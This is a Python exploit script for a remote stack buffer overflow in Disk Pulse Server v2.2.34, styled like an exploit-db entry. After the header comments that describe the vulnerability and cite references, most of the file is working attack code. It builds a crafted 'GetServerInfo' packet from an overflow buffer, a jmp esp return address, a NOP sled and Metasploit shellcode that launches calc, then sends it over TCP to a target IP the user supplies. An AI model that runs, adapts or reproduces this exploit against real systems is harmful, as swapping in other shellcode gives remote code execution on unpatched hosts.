#!/usr/bin/python
 
# Exploit Title: Disk Pulse Server v2.2.34 Remote Buffer Overflow Exploit
# Date: 10/11/2010
# Author: xsploited security
# URL: http://www.x-sploited.com/
# Contact: xsploitedsecurity [at] gmail.com
# Software Link: http://www.diskpulse.com/setups/diskpulsesrv_setup_v2.2.34.exe
# Version: v2.2.34
# Tested on: Windows XP SP3 (Physical machine)
# CVE : N/A
 
# Vulnerability Information:
# A vulnerability exists in the way Disk Pulse Server v2.2.34 process a remote clients "GetServerInfo" request.
# The vulnerability is caused due to a boundary error in libpal.dll when handling network messages and can be exploited
# to cause a stack-based buffer overflow via a specially crafted packet sent to TCP port 9120.
 
# Other notes:
# It appears the vendor likes using the same server code (that was effected by my previous PoC: http://www.exploit-db.com/exploits/15231)
# for everything client/server related. It is also safe to say that the client(s) are most likely effected by bugs as well.
 
# Other possibly affected versions:
# Disk Pulse Server <= 1.7.x
 
# References:
# http://secunia.com/advisories/41748/
# http://www.exploit-db.com/exploits/15231
# http://securityreason.com/exploitalert/9247
 
# Shouts:
# kAoTiX, MAX, CorelanCoder, exploit-db (of course), all other security crews and sites.
 
import sys,socket
 
if len(sys.argv) != 2:
    print "[!] Usage: ./diskpulse.py <Target IP>"
    sys.exit(1)
 
about = "=================================================\n"
about += "Title: Disk Pulse Server v2.2.34 Remote BOF PoC\n"
about +=  "Author: xsploited security\nURL: http://www.x-sploited.com/\n"
about +=  "Contact: xsploitedsecurity [at] gmail.com\n"
about +=  "=================================================\n"
print about
 
host = sys.argv[1]
port = 9120 #default server port
 
# windows/exec - 218 bytes / http://www.metasploit.com
# Encoder: x86/fnstenv_mov / EXITFUNC=seh, CMD=calc
calc = ("\x6a\x31\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x97\x8c"
"\x8a\x10\x83\xeb\xfc\xe2\xf4\x6b\x64\x03\x10\x97\x8c\xea\x99"
"\x72\xbd\x58\x74\x1c\xde\xba\x9b\xc5\x80\x01\x42\x83\x07\xf8"
"\x38\x98\x3b\xc0\x36\xa6\x73\xbb\xd0\x3b\xb0\xeb\x6c\x95\xa0"
"\xaa\xd1\x58\x81\x8b\xd7\x75\x7c\xd8\x47\x1c\xde\x9a\x9b\xd5"
"\xb0\x8b\xc0\x1c\xcc\xf2\x95\x57\xf8\xc0\x11\x47\xdc\x01\x58"
"\x8f\x07\xd2\x30\x96\x5f\x69\x2c\xde\x07\xbe\x9b\x96\x5a\xbb"
"\xef\xa6\x4c\x26\xd1\x58\x81\x8b\xd7\xaf\x6c\xff\xe4\x94\xf1"
"\x72\x2b\xea\xa8\xff\xf2\xcf\x07\xd2\x34\x96\x5f\xec\x9b\x9b"
"\xc7\x01\x48\x8b\x8d\x59\x9b\x93\x07\x8b\xc0\x1e\xc8\xae\x34"
"\xcc\xd7\xeb\x49\xcd\xdd\x75\xf0\xcf\xd3\xd0\x9b\x85\x67\x0c"
"\x4d\xfd\x8d\x07\x95\x2e\x8c\x8a\x10\xc7\xe4\xbb\x9b\xf8\x0b"
"\x75\xc5\x2c\x72\x84\x22\x7d\xe4\x2c\x85\x2a\x11\x75\xc5\xab"
"\x8a\xf6\x1a\x17\x77\x6a\x65\x92\x37\xcd\x03\xe5\xe3\xe0\x10"
"\xc4\x73\x5f\x73\xf6\xe0\xe9\x10");
     
# Begin payload buffer:
 
packet_header = ("\x47\x65\x74\x53\x65\x72\x76\x65\x72\x49\x6E\x66\x6F\x02");       # ASCII = "GetServerInfo."
 
junk = "\x41" * 256;            #256 byte junk buffer to reach eip
eip = "\xFB\xF8\xAB\x71";       #jmp esp (via ws2_32.dll)
nops = "\x90" * 12;             #small nop sled
 
# packet structure:
# [header][junk][eip][nops][shellcode][nops][nops]
packet = packet_header + junk + eip + nops + calc + nops + nops;
 
print "[*] Connecting to " + host + "...\r"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print "[*] Connected, Sending payload\r"
s.send(packet + "\r\n")
print "[*] Payload sent successfully"
print "[*] Check the results\r"
s.close()
